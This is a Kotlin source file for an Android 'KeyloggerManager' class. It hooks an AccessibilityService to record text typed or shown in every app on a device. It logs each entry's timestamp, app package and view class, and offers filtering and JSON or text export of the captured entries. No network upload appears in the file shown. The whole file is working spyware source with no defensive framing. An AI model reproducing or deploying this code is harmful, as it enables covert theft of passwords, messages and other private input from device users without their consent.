package com.sync.xxx.managers

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.provider.Settings
import android.text.TextUtils
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ConcurrentLinkedQueue

/**
 * KeyloggerManager.kt
 * Capture keyboard input using AccessibilityService
 * Logs all typed text from all applications
 */
class KeyloggerManager(private val context: Context) {

    private val TAG = "KeyloggerManager"
    
    private val keylogQueue = ConcurrentLinkedQueue<KeylogEntry>()
    private var isEnabled = false
    private var keylogListener: ((KeylogEntry) -> Unit)? = null
    
    // Maximum queue size before auto-flush
    private val maxQueueSize = 1000

    /**
     * Check if accessibility service is enabled
     */
    fun isAccessibilityEnabled(): Boolean {
        val enabledServices = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        )
        
        if (enabledServices.isNullOrEmpty()) {
            return false
        }
        
        val colonSplitter = TextUtils.SimpleStringSplitter(':')
        colonSplitter.setString(enabledServices)
        
        while (colonSplitter.hasNext()) {
            val componentName = colonSplitter.next()
            if (componentName.contains(context.packageName)) {
                return true
            }
        }
        
        return false
    }

    /**
     * Start keylogging
     * @param listener Optional listener for real-time keylog events
     */
    fun startKeylogging(listener: ((KeylogEntry) -> Unit)? = null) {
        if (!isAccessibilityEnabled()) {
            Log.e(TAG, "Accessibility service not enabled")
            return
        }

        isEnabled = true
        keylogListener = listener
        Log.d(TAG, "Keylogging started")
    }

    /**
     * Stop keylogging
     */
    fun stopKeylogging() {
        isEnabled = false
        keylogListener = null
        Log.d(TAG, "Keylogging stopped")
    }

    /**
     * Process accessibility event (called from AccessibilityService)
     */
    fun processEvent(event: AccessibilityEvent) {
        if (!isEnabled) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                handleTextChanged(event)
            }
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                handleViewFocused(event)
            }
        }
    }

    /**
     * Handle text changed event
     */
    private fun handleTextChanged(event: AccessibilityEvent) {
        val text = event.text.toString()
        if (text.isEmpty() || text == "[]") return

        val packageName = event.packageName?.toString() ?: "unknown"
        val className = event.className?.toString() ?: "unknown"
        
        val entry = KeylogEntry(
            timestamp = System.currentTimeMillis(),
            packageName = packageName,
            className = className,
            text = text,
            eventType = "TEXT_CHANGED"
        )
        
        addEntry(entry)
    }

    /**
     * Handle view focused event
     */
    private fun handleViewFocused(event: AccessibilityEvent) {
        val text = event.text.toString()
        if (text.isEmpty() || text == "[]") return

        val packageName = event.packageName?.toString() ?: "unknown"
        val className = event.className?.toString() ?: "unknown"
        
        val entry = KeylogEntry(
            timestamp = System.currentTimeMillis(),
            packageName = packageName,
            className = className,
            text = text,
            eventType = "VIEW_FOCUSED"
        )
        
        addEntry(entry)
    }

    /**
     * Add keylog entry
     */
    private fun addEntry(entry: KeylogEntry) {
        keylogQueue.add(entry)
        keylogListener?.invoke(entry)
        
        // Auto-flush if queue is too large
        if (keylogQueue.size > maxQueueSize) {
            val excess = keylogQueue.size - (maxQueueSize / 2)
            repeat(excess) {
                keylogQueue.poll()
            }
            Log.w(TAG, "Queue overflow, removed $excess old entries")
        }
    }

    /**
     * Get all keylog entries
     */
    fun getAllEntries(): List<KeylogEntry> {
        return keylogQueue.toList()
    }

    /**
     * Get entries from specific package
     */
    fun getEntriesFromPackage(packageName: String): List<KeylogEntry> {
        return keylogQueue.filter { it.packageName == packageName }
    }

    /**
     * Get entries within time range
     */
    fun getEntriesInTimeRange(startTime: Long, endTime: Long): List<KeylogEntry> {
        return keylogQueue.filter { it.timestamp in startTime..endTime }
    }

    /**
     * Clear all entries
     */
    fun clearEntries() {
        keylogQueue.clear()
        Log.d(TAG, "All entries cleared")
    }

    /**
     * Get entries as JSON
     */
    fun getEntriesAsJson(): JSONArray {
        val jsonArray = JSONArray()
        keylogQueue.forEach { entry ->
            jsonArray.put(entry.toJson())
        }
        return jsonArray
    }

    /**
     * Export entries to string
     */
    fun exportEntries(): String {
        val sb = StringBuilder()
        val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        
        keylogQueue.forEach { entry ->
            sb.append("=".repeat(60)).append("\n")
            sb.append("Time: ${dateFormat.format(Date(entry.timestamp))}\n")
            sb.append("App: ${entry.packageName}\n")
            sb.append("Class: ${entry.className}\n")
            sb.append("Type: ${entry.eventType}\n")
            sb.append("Text: ${entry.text}\n")
        }
        
        return sb.toString()
    }

    /**
     * Get queue size
     */
    fun getQueueSize(): Int = keylogQueue.size

    /**
     * Check if keylogging is active
     */
    fun isEnabled(): Boolean = isEnabled

    companion object {
        /**
         * Check if accessibility service is enabled
         */
        fun isAccessibilityEnabled(context: Context, serviceClass: Class<*>): Boolean {
            val enabledServices = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            )
            
            if (enabledServices.isNullOrEmpty()) {
                return false
            }
            
            val serviceName = "${context.packageName}/${serviceClass.name}"
            return enabledServices.contains(serviceName)
        }
    }

    /**
     * Data class for keylog entry
     */
    data class KeylogEntry(
        val timestamp: Long,
        val packageName: String,
        val className: String,
        val text: String,
        val eventType: String
    ) {
        fun toJson(): JSONObject {
            return JSONObject().apply {
                put("timestamp", timestamp)
                put("packageName", packageName)
                put("className", className)
                put("text", text)
                put("eventType", eventType)
                put("date", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(timestamp)))
            }
        }
    }
}
